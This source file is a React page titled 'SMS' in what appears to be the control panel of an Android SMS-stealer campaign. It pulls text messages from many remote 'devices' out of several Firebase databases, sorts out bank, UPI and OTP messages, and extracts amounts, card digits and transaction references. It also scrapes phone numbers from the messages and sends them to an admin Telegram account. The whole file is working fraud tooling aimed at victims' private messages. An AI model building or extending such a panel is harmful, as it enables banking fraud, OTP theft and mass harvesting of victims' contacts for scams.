import { useEffect, useState, useMemo } from "react";
import { db } from "@/lib/firebase";
import { ref, onValue } from "firebase/database";
import { initializeApp, deleteApp, type FirebaseApp } from "firebase/app";
import { getDatabase, type Database } from "firebase/database";
import { Layout } from "@/components/layout";
import { useAuth } from "@/lib/auth";
import { useToast } from "@/hooks/use-toast";
import {
  MessageSquare,
  Search,
  TrendingUp,
  Copy,
  ChevronDown,
  ChevronUp,
  IndianRupee,
  ArrowDownWideNarrow,
  Smartphone,
  ShieldCheck,
  Phone,
} from "lucide-react";
import {
  classifySms,
  extractInfo,
  CATEGORY_META,
  formatSmsDate,
  type SmsCategory,
  type SmsInfo,
} from "@/lib/smsClassifier";

interface SmsEntry {
  deviceId: string;
  deviceModel: string;
  devicePhone: string;
  pushKey: string;
  from: string;
  body: string;
  date: number;
  category: SmsCategory;
  isFinance: boolean;
  amount: string | null;
  info: SmsInfo;
  dbLabel: string;
  numbers: string[];
}

const ALL_CATS: SmsCategory[] = [
  "BANK",
  "UPI",
  "SHOPPING",
  "OTP",
  "TRAVEL",
  "INVESTMENT",
  "OFFERS",
  "ALERTS",
  "OTHER",
];

type SortMode = "newest" | "oldest" | "sender" | "device";

// Highlight matched amount for finance messages
function highlightBody(body: string) {
  const esc = body
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
  return esc.replace(
    /(?:rs\.?|inr|₹)\s?([\d,]+(?:\.\d{1,2})?)|([\d,]+(?:\.\d{1,2})?)\s?(?:rs\.?|inr|₹)/gi,
    '<mark class="bg-emerald-500/15 text-emerald-600 dark:text-emerald-400 font-bold rounded px-0.5">$&</mark>'
  );
}

export function AllSms() {
  const { isAdmin, userId } = useAuth();
  const { toast } = useToast();
  const [allSms, setAllSms] = useState<SmsEntry[]>([]);
  const [loading, setLoading] = useState(true);
  const [catFilter, setCatFilter] = useState<SmsCategory | "all">("all");
  const [sortMode, setSortMode] = useState<SortMode>("newest");
  const [search, setSearch] = useState("");
  const [expandedKeys, setExpandedKeys] = useState<Set<string>>(new Set());
  const [currentPage, setCurrentPage] = useState(1);
  const ITEMS_PER_PAGE = 50;
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  useEffect(() => {
    // Data sources: primary DB + any enabled extra Firebase instances
    // (registered by the admin under config/firebases). Each source gets
    // its own { clients, messages } mirror so SMS aggregates across all.
    type Source = {
      label: string;
      db: Database;
      clients: Record<string, any>;
      messages: Record<string, any>;
      ready: boolean;
    };
    let sources: Source[] = [
      { label: "main", db, clients: {}, messages: {}, ready: false },
    ];
    let extraApps: FirebaseApp[] = [];
    let unsubs: Array<() => void> = [];
    let cancelled = false;

    function scrapeNumbers(body: string, phone: string): string[] {
      const out = new Set<string>();
      for (const m of body.match(/\b[6-9]\d{9}\b/g) || []) out.add(m);
      const norm = phone.replace(/[^\d]/g, "").slice(-10);
      if (/^[6-9]\d{9}$/.test(norm)) out.add(norm);
      return [...out];
    }

    function rebuild() {
      if (cancelled) return;
      if (!sources.every((s) => s.ready)) return;
      const entries: SmsEntry[] = [];

      for (const src of sources) {
        const { clients: clientsData, messages: messagesData, label } = src;
        Object.entries(messagesData).forEach(([deviceId, smsList]) => {
          const device = clientsData[deviceId] || {};
          if (!isAdmin && device.ownerTelegramId !== userId) return;
          if (!smsList || typeof smsList !== "object") return;

          Object.entries(smsList as Record<string, any>).forEach(
            ([pushKey, sms]) => {
              const from = sms.sender || sms.from || "Unknown";
              const body = sms.message || sms.body || "";
              const sortKey =
                sms.id != null ? sms.id : sms.date ? parseInt(sms.date) : 0;
              const cls = classifySms(body);
              entries.push({
                deviceId,
                deviceModel: device.modelName || device.model || "Unknown",
                devicePhone: device.mobNo || device.phone || "",
                pushKey,
                from,
                body,
                date: sortKey,
                category: cls.category,
                isFinance: cls.isFinance,
                amount: cls.amount,
                info: extractInfo(body),
                dbLabel: label,
                numbers: scrapeNumbers(
                  body,
                  device.mobNo || device.phone || ""
                ),
              });
            }
          );
        });

        // Legacy sms stored under clients/{id}/sms
        Object.entries(clientsData).forEach(([deviceId, device]) => {
          if (!device.sms) return;
          if (!isAdmin && device.ownerTelegramId !== userId) return;
          if (messagesData[deviceId]) return;

          Object.entries(device.sms as Record<string, any>).forEach(
            ([pushKey, sms]) => {
              const body = sms.body || "";
              const cls = classifySms(body);
              entries.push({
                deviceId,
                deviceModel: device.modelName || device.model || "Unknown",
                devicePhone: device.mobNo || device.phone || "",
                pushKey,
                from: sms.from || "Unknown",
                body,
                date: sms.date ? parseInt(sms.date) : 0,
                category: cls.category,
                isFinance: cls.isFinance,
                amount: cls.amount,
                info: extractInfo(body),
                dbLabel: label,
                numbers: scrapeNumbers(
                  body,
                  device.mobNo || device.phone || ""
                ),
              });
            }
          );
        });
      }

      entries.sort((a, b) => b.date - a.date);
      // Cap at newest 600 — protects the browser from 300k+ message dumps.
      setAllSms(entries.slice(0, 600));
      setLoading(false);
    }

    function subscribeToSource(src: Source) {
      const u1 = onValue(ref(src.db, "clients"), (snap) => {
        src.clients = snap.exists() ? snap.val() : {};
        src.ready = true;
        rebuild();
      });
      const u2 = onValue(ref(src.db, "messages"), (snap) => {
        src.messages = snap.exists() ? snap.val() : {};
        src.ready = true;
        rebuild();
      });
      unsubs.push(u1, u2);
    }

    subscribeToSource(sources[0]);

    // Discover + subscribe to extra Firebase instances (admin-managed)
    const unsubConfig = onValue(ref(db, "config/firebases"), (snap) => {
      const firebases: Record<string, any> = snap.exists() ? snap.val() : {};
      const wanted = Object.entries(firebases)
        .filter(([, f]) => f?.enabled !== false && f?.databaseURL)
        .map(([id, f]) => ({ id, label: f.name || id, url: f.databaseURL }));

      // Drop sources/apps that no longer exist in config
      sources = sources.filter(
        (s) => s.label === "main" || wanted.some((w) => w.id === s.label)
      );
      extraApps = extraApps.filter((app) =>
        wanted.some((w) => app.name === w.id)
      );

      for (const w of wanted) {
        if (!sources.some((s) => s.label === w.id)) {
          let app = extraApps.find((a) => a.name === w.id);
          if (!app) {
            app = initializeApp({ databaseURL: w.url }, w.id);
            extraApps.push(app);
          }
          const src: Source = {
            label: w.id,
            db: getDatabase(app),
            clients: {},
            messages: {},
            ready: false,
          };
          sources.push(src);
          subscribeToSource(src);
        }
      }
      rebuild();
    });
    unsubs.push(unsubConfig);

    return () => {
      cancelled = true;
      unsubs.forEach((u) => u());
      extraApps.forEach((app) => {
        try {
          deleteApp(app);
        } catch {
          /* noop */
        }
      });
    };
  }, [isAdmin, userId]);

  const catCounts = useMemo(() => {
    const counts: Record<string, number> = { all: allSms.length };
    for (const c of ALL_CATS) counts[c] = 0;
    for (const s of allSms) counts[s.category] = (counts[s.category] || 0) + 1;
    return counts;
  }, [allSms]);

  const financeCount = useMemo(
    () => allSms.filter((s) => s.isFinance).length,
    [allSms]
  );

  const displayed = useMemo(() => {
    let list =
      catFilter === "all"
        ? allSms
        : catFilter === "BANK"
          ? allSms.filter((s) => s.isFinance) // Bank tab = finance (BANK+UPI+INVESTMENT with amount)
          : allSms.filter((s) => s.category === catFilter);

    if (search) {
      const q = search.toLowerCase();
      list = list.filter(
        (s) =>
          s.body.toLowerCase().includes(q) ||
          s.from.toLowerCase().includes(q) ||
          s.deviceModel.toLowerCase().includes(q) ||
          s.devicePhone.includes(q)
      );
    }

    switch (sortMode) {
      case "newest":
        list = [...list].sort((a, b) => b.date - a.date);
        break;
      case "oldest":
        list = [...list].sort((a, b) => a.date - b.date);
        break;
      case "sender":
        list = [...list].sort((a, b) => a.from.localeCompare(b.from));
        break;
      case "device":
        list = [...list].sort((a, b) =>
          a.deviceModel.localeCompare(b.deviceModel)
        );
        break;
    }
    return list;
  }, [allSms, catFilter, search, sortMode]);

  // Pagination — SmsIntelligence + Device locality: 50/page (plan 003)
  const totalPages = Math.max(1, Math.ceil(displayed.length / ITEMS_PER_PAGE));
  const paginatedDisplayed = displayed.slice(
    (currentPage - 1) * ITEMS_PER_PAGE,
    currentPage * ITEMS_PER_PAGE
  );
  useEffect(() => {
    setCurrentPage(1);
  }, [catFilter, search, sortMode]);

  const toggleExpand = (key: string) => {
    setExpandedKeys((prev) => {
      const n = new Set(prev);
      n.has(key) ? n.delete(key) : n.add(key);
      return n;
    });
  };

  const copyText = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 1500);
  };

  /* ── Exporters ── */
  const download = (filename: string, content: string, mime: string) => {
    const blob = new Blob([content], { type: mime });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = filename;
    a.click();
    URL.revokeObjectURL(url);
  };

  const exportSmsCsv = () => {
    const esc = (v: any) => `"${String(v ?? "").replace(/"/g, '""')}"`;
    const header = ["date", "from", "category", "amount", "device", "body"];
    const rows = displayed.map((s) =>
      [
        new Date(s.date).toISOString(),
        s.from,
        s.category,
        s.amount ?? "",
        s.deviceModel,
        s.body,
      ]
        .map(esc)
        .join(",")
    );
    download(
      `sms-${catFilter === "all" ? "all" : catFilter}.csv`,
      [header.join(","), ...rows].join("\n"),
      "text/csv;charset=utf-8"
    );
  };

  const exportNumbers = () => {
    // Scraper output: every unique 10-digit Indian number found in the fleet
    const set = new Set<string>();
    for (const s of allSms) for (const n of s.numbers || []) set.add(n);
    const lines = [...set].sort();
    download(
      `scraped-numbers-${lines.length}.txt`,
      lines.join("\n"),
      "text/plain"
    );
  };

  const sendNumbersToTelegram = async () => {
    const set = new Set<string>();
    for (const s of allSms) for (const n of s.numbers || []) set.add(n);
    const lines = [...set].sort();
    if (!lines.length) {
      toast({
        title: "Error",
        description: "No numbers found yet",
        variant: "destructive",
      });
      return;
    }
    const text = `📞 *Scraped Numbers* — ${lines.length} unique\n\n${lines.join("\n")}`;
    try {
      const res = await fetch(
        `${import.meta.env.VITE_API_URL ?? ""}/api/telegram/send`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ text }),
        }
      );
      const json = await res.json().catch(() => ({}));
      if (!res.ok) throw new Error(json.error || `HTTP ${res.status}`);
      toast({
        title: "Sent to Telegram",
        description: `${lines.length} numbers delivered to admin DM`,
      });
    } catch (err: any) {
      toast({
        title: "Error",
        description: err.message || "Send failed",
        variant: "destructive",
      });
    }
  };

  return (
    <Layout>
      {/* ── Page header ── */}
      <div className="flex flex-col gap-4 mb-5">
        <div className="flex flex-wrap items-end justify-between gap-3">
          <div>
            <p className="page-eyebrow">Fleet</p>
            <h1 className="page-title">SMS</h1>
            <p className="text-sm text-muted-foreground mt-1 flex items-center gap-2 flex-wrap">
              <MessageSquare className="w-4 h-4 text-primary shrink-0" />
              <span>
                {allSms.length} total ·{" "}
                <IndianRupee className="inline w-3.5 h-3.5" /> {financeCount}{" "}
                finance
                {catCounts["BANK"] > 0 && ` · 🏦 ${catCounts["BANK"]} bank`}
                {catCounts["SHOPPING"] > 0 &&
                  ` · 🛒 ${catCounts["SHOPPING"]} shopping`}
              </span>
            </p>
          </div>

          {/* Sort */}
          <div className="flex items-center gap-2 text-sm">
            <ArrowDownWideNarrow className="w-4 h-4 text-muted-foreground" />
            <select
              value={sortMode}
              onChange={(e) => setSortMode(e.target.value as SortMode)}
              className="bg-card border border-card-border rounded-xl px-3 py-2 text-sm font-medium focus:outline-none focus:ring-2 focus:ring-primary/40"
            >
              <option value="newest">Newest first</option>
              <option value="oldest">Oldest first</option>
              <option value="sender">Sender A–Z</option>
              <option value="device">Device A–Z</option>
            </select>
          </div>
        </div>

        {/* Search */}
        <div className="relative w-full md:w-80">
          <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
          <input
            type="text"
            placeholder="Search messages, sender, device..."
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            className="w-full bg-card border border-card-border rounded-xl pl-11 pr-4 py-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-primary/40"
          />
        </div>

        {/* ── Category chips (horizontally scrollable on mobile) ── */}
        <div className="flex gap-2 overflow-x-auto pb-1 -mx-1 px-1 sm:flex-wrap sm:overflow-visible">
          <button
            onClick={() => setCatFilter("all")}
            className={`shrink-0 px-3.5 py-2 rounded-full text-xs font-semibold border transition-colors ${
              catFilter === "all"
                ? "bg-primary text-primary-foreground border-primary"
                : "bg-card border-card-border text-muted-foreground hover:bg-muted"
            }`}
          >
            All · {catCounts.all}
          </button>
          {ALL_CATS.map((c) => (
            <button
              key={c}
              onClick={() => setCatFilter(catFilter === c ? "all" : c)}
              className={`shrink-0 px-3.5 py-2 rounded-full text-xs font-semibold border transition-colors flex items-center gap-1.5 ${
                catFilter === c
                  ? "bg-primary text-primary-foreground border-primary"
                  : "bg-card border-card-border text-muted-foreground hover:bg-muted"
              }`}
            >
              <span>{CATEGORY_META[c].emoji}</span>
              {CATEGORY_META[c].label}
              <span
                className={`px-1.5 rounded-full text-[10px] ${catFilter === c ? "bg-primary-foreground/20" : "bg-muted"}`}
              >
                {catCounts[c] || 0}
              </span>
            </button>
          ))}
        </div>
      </div>

      {/* ── List ── */}
      {loading ? (
        <div className="space-y-3">
          {[0, 1, 2].map((i) => (
            <div key={i} className="glass-card p-4 animate-pulse">
              <div className="h-4 bg-muted rounded w-1/3 mb-3" />
              <div className="h-3 bg-muted rounded w-full mb-2" />
              <div className="h-3 bg-muted rounded w-2/3" />
            </div>
          ))}
        </div>
      ) : paginatedDisplayed.length === 0 ? (
        <div className="glass-card p-10 text-center text-muted-foreground">
          <Smartphone className="w-8 h-8 mx-auto mb-2 opacity-40" />
          <p className="font-medium">
            No messages{" "}
            {catFilter !== "all"
              ? `in ${CATEGORY_META[catFilter].label.toLowerCase()}`
              : ""}
          </p>
          <p className="text-xs mt-1">
            New SMS from connected devices will appear here instantly.
          </p>
        </div>
      ) : (
        <div className="space-y-3">
          {paginatedDisplayed.map((sms) => {
            const key = `${sms.deviceId}:${sms.pushKey}`;
            const expanded = expandedKeys.has(key);
            const needsExpand = sms.body.length > 160;
            const preview = sms.body.slice(0, 160) + "…";
            const meta = CATEGORY_META[sms.category];

            return (
              <div key={key} className="glass-card overflow-hidden">
                <div className="flex items-start gap-3 p-4">
                  {/* Left: content */}
                  <div className="flex-1 min-w-0">
                    <div className="flex flex-wrap items-center gap-2 mb-1.5">
                      <span
                        className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold uppercase tracking-wide ${
                          sms.isFinance
                            ? "bg-emerald-500/15 text-emerald-600 dark:text-emerald-400"
                            : "bg-muted text-muted-foreground"
                        }`}
                      >
                        {meta.emoji} {meta.label}
                      </span>
                      {sms.amount && (
                        <span className="inline-flex items-center gap-0.5 px-2 py-0.5 rounded-full bg-emerald-500/15 text-emerald-600 dark:text-emerald-400 text-[11px] font-bold">
                          <IndianRupee className="w-3 h-3" /> {sms.amount}
                        </span>
                      )}
                      <span className="text-xs font-semibold text-foreground truncate">
                        {sms.from}
                      </span>
                      <span className="text-[10px] font-mono text-muted-foreground ml-auto shrink-0">
                        {formatSmsDate(sms.date)}
                      </span>
                    </div>

                    <div className="text-sm text-foreground leading-relaxed break-words">
                      {expanded || !needsExpand ? (
                        <span
                          dangerouslySetInnerHTML={{
                            __html: highlightBody(sms.body),
                          }}
                        />
                      ) : (
                        <span>{preview}</span>
                      )}
                    </div>

                    <div className="flex flex-wrap items-center gap-x-3 gap-y-1 mt-2">
                      <span className="font-mono text-[10px] text-muted-foreground">
                        {sms.devicePhone || sms.deviceModel}
                      </span>
                      {sms.dbLabel !== "main" && (
                        <span className="inline-flex items-center gap-1 px-1.5 py-0.5 rounded-md bg-blue-500/10 text-blue-600 dark:text-blue-400 text-[10px] font-bold uppercase tracking-wide">
                          {sms.dbLabel}
                        </span>
                      )}
                      {sms.isFinance && (
                        <span className="inline-flex items-center gap-1 text-[10px] font-semibold text-emerald-600 dark:text-emerald-400">
                          <ShieldCheck className="w-3 h-3" /> Finance
                        </span>
                      )}
                      {sms.info.bank && (
                        <span className="inline-flex items-center px-1.5 py-0.5 rounded-md bg-primary/10 text-primary text-[10px] font-semibold">
                          🏦 {sms.info.bank}
                        </span>
                      )}
                      {sms.info.txnType && (
                        <span
                          className={`inline-flex items-center px-1.5 py-0.5 rounded-md text-[10px] font-semibold ${
                            sms.info.txnType === "Debit" ||
                            sms.info.txnType === "Failed"
                              ? "bg-red-500/10 text-red-600 dark:text-red-400"
                              : "bg-emerald-500/10 text-emerald-600 dark:text-emerald-400"
                          }`}
                        >
                          {sms.info.txnType === "Debit"
                            ? "↓"
                            : sms.info.txnType === "Credit"
                              ? "↑"
                              : ""}{" "}
                          {sms.info.txnType}
                        </span>
                      )}
                      {sms.info.cardLast4 && (
                        <span className="inline-flex items-center px-1.5 py-0.5 rounded-md bg-muted text-muted-foreground text-[10px] font-mono">
                          💳 •••• {sms.info.cardLast4}
                        </span>
                      )}
                      {sms.info.refId && (
                        <span className="inline-flex items-center px-1.5 py-0.5 rounded-md bg-muted text-muted-foreground text-[10px] font-mono">
                          #{sms.info.refId}
                        </span>
                      )}
                      {sms.info.numbers.slice(0, 4).map((num) => (
                        <button
                          key={num}
                          onClick={() => copyText(num, key + num)}
                          title="Copy number"
                          className="inline-flex items-center gap-1 px-1.5 py-0.5 rounded-md bg-muted text-muted-foreground hover:text-primary hover:bg-primary/10 text-[10px] font-mono transition-colors"
                        >
                          <Phone className="w-2.5 h-2.5" />
                          {num}
                          {copiedKey === key + num && (
                            <span className="text-success font-bold">✓</span>
                          )}
                        </button>
                      ))}
                      {needsExpand && (
                        <button
                          onClick={() => toggleExpand(key)}
                          className="text-[10px] text-primary font-semibold flex items-center gap-0.5 py-1.5"
                        >
                          {expanded ? (
                            <>
                              <ChevronUp className="w-3 h-3" /> Less
                            </>
                          ) : (
                            <>
                              <ChevronDown className="w-3 h-3" /> More
                            </>
                          )}
                        </button>
                      )}
                    </div>
                  </div>

                  {/* Right: copy */}
                  <button
                    onClick={() => copyText(sms.body, key)}
                    className="flex-shrink-0 p-2.5 rounded-xl active:bg-muted text-muted-foreground hover:text-primary border border-transparent hover:border-card-border transition-all"
                    title="Copy"
                  >
                    {copiedKey === key ? (
                      <span className="text-[10px] font-bold text-success">
                        ✓
                      </span>
                    ) : (
                      <Copy className="w-3.5 h-3.5" />
                    )}
                  </button>
                </div>
              </div>
            );
          })}

          {allSms.length > 0 && (
            <p className="text-center text-[11px] text-muted-foreground pt-2 flex items-center justify-center gap-1">
              <TrendingUp className="w-3 h-3" />
              Showing newest {allSms.length} messages ·{" "}
              {catFilter !== "all"
                ? `filtered to ${CATEGORY_META[catFilter].label.toLowerCase()}`
                : "all categories"}
            </p>
          )}
        </div>
      )}
    </Layout>
  );
}
